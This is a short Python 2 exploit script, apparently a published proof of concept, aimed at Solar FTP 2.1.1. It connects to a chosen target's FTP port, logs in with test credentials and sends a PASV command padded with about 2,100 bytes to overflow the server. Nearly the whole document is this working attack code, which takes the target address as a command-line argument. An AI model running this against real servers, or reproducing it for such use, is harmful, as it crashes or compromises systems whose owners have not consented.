#!/usr/bin/python
##########################################################################################################
#Title: Solar FTP 2.1.1 PASV Exploit
#Author: Rio Atmadja
#OS Tested: XP SP3 32bit
##########################################################################################################
import socket,sys,time,struct

if len(sys.argv) < 2:
     print "[-]Usage: %s <target addr> " % sys.argv[0]
     
     sys.exit(0)

target = sys.argv[1]

if len(sys.argv) > 2:
     platform = sys.argv[2]

crash = '\x42' * 123 + '\x42' * 4 + '\x43' * 2000

print "\
[*] Solar FTP 2.1.1 PASV Exploit\n\
[*] Connecting to "+target

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((target,21))
except:
    print "[-] Connection to "+target+" failed!"
    sys.exit(0)

print "[*] Sending " + `len(crash)` + " byte PASV crash..."

s.send("USER test\r\n")
s.recv(1024)
s.send("PASS test\r\n")
s.recv(1024)
s.send("PASV " + crash + "\r\n")


